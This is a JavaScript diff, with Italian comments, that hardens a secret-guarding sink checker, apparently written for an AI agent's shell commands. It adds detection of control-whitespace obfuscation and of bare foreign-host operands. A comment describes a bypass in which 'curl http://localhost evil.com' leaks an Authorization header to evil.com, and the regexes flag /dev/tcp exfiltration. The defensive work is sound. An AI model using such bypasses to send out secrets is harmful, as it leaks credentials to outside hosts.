@@ -140,11 +140,33 @@ export function hasInsecureHttp(opText) {
  */
 export function hasCommandComposition(opText) {
   const t = String(opText ?? "");
-  if (/[\n;`|]/.test(t)) return true;                        // newline · ; · backtick · pipe (incl. ||)
+  // separatori-di-comando + whitespace-di-CONTROLLO (TAB/CR/VT/FF/NUL): NON lo SPACE (0x20) — rompe ogni comando —
+  // ma gli altri whitespace sono anomali in un comando legittimo e servono a obfuscare operandi (review-loop #2 2026-06-30).
+  if (/[\n\r\t\f\v\0;`|]/.test(t)) return true;              // newline/CR/TAB/VT/FF/NUL · ; · backtick · pipe (incl. ||)
   if (/&&/.test(t) || /(^|\s)&(\s|$)/.test(t)) return true;  // && · backgrounding & (non &param di URL)
   if (/\$\(|<\(/.test(t)) return true;                       // $(...) · <(...)
   if (/\/dev\/(tcp|udp)\b/i.test(t)) return true;            // bash network redirect (esfil senza nc)
   return false;
+}
+
+/**
+ * L'operazione contiene un token-HOST "estraneo" (un dominio-con-TLD o un IPv4) che NON è loopback? Guardia
+ * STRUTTURALE del fast-path allowLocalHttp (review-loop #2 2026-06-30, P0 bare-operand). CAUSA-RADICE: `extractHosts`
+ * vede solo gli host `scheme://`, ma `curl`/`wget` accettano operandi SENZA schema (`curl http://localhost evil.com`
+ * → `evil.com` diventa un 2° URL su porta 80 e l'header `-H Authorization:` col segreto vi viene applicato → leak
+ * esterno). Qui catturiamo OGNI dominio-con-TLD o IPv4 nel testo e pretendiamo che sia loopback; se ne resta uno
+ * estraneo → la shape NON è pulita → blocco. (Falso-positivo possibile su domini/IP citati in un body: si erra SAFE,
+ * il modello semplifichi il comando.) NB: `localhost` (senza punto) NON matcha → è gestito da extractHosts+isLoopbackLiteral.
+ */
+export function hasForeignHostToken(opText) {
+  const t = String(opText ?? "");
+  const toks = [];
+  let m;
+  const ipRe = /\b(?:\d{1,3}\.){3}\d{1,3}\b/g;                                   // IPv4
+  while ((m = ipRe.exec(t))) toks.push(m[0]);
+  const domRe = /\b[a-z0-9](?:[a-z0-9-]*[a-z0-9])?(?:\.[a-z0-9](?:[a-z0-9-]*[a-z0-9])?)*\.[a-z]{2,}\b/gi; // dominio con TLD alfa
+  while ((m = domRe.exec(t))) toks.push(m[0]);
+  return toks.some((h) => !isLoopbackLiteral(h));
 }
 
 /**
@@ -188,7 +210,9 @@ export function checkSink(name, opText, mode = "strict") {
   // E allowedSinks per QUEL solo comando-loopback (qualsiasi schema: anche https://localhost).
   const urlCount = (String(opText).match(/:\/\//g) || []).length;
   if (s.allowLocalHttp && hosts.length && hosts.every(isLoopbackLiteral)
-      && !fileExfil && !hostPinned && urlCount === 1 && !hasCommandComposition(opText)) {
+      && !fileExfil && !hostPinned && urlCount === 1
+      && !hasCommandComposition(opText) && !hasForeignHostToken(opText)) {
+    // (g) niente token-host estraneo: chiude il bare-operand (`curl http://localhost evil.com` → evil.com = 2° URL).
     return { allowed: true };
   }
   // https-only: un sealed-secret NON transita su http:// in chiaro (vale in strict E warn: è igiene crittografica).
@@ -360,4 +384,4 @@ export function clearSealed() {
   ingressCounter = 0;
 }
 
-export default { setSecret, setAllowLocalHttp, listSecretsMeta, hasSecret, referencedSecrets, extractHosts, hasFileOrPipeExfil, hasInsecureHttp, hasCommandComposition, hasHostPinning, isLoopbackLiteral, checkSink, injectSecrets, injectIntoStrings, scanIngress, loadFromEnv, clearSealed };
+export default { setSecret, setAllowLocalHttp, listSecretsMeta, hasSecret, referencedSecrets, extractHosts, hasFileOrPipeExfil, hasInsecureHttp, hasCommandComposition, hasForeignHostToken, hasHostPinning, isLoopbackLiteral, checkSink, injectSecrets, injectIntoStrings, scanIngress, loadFromEnv, clearSealed };
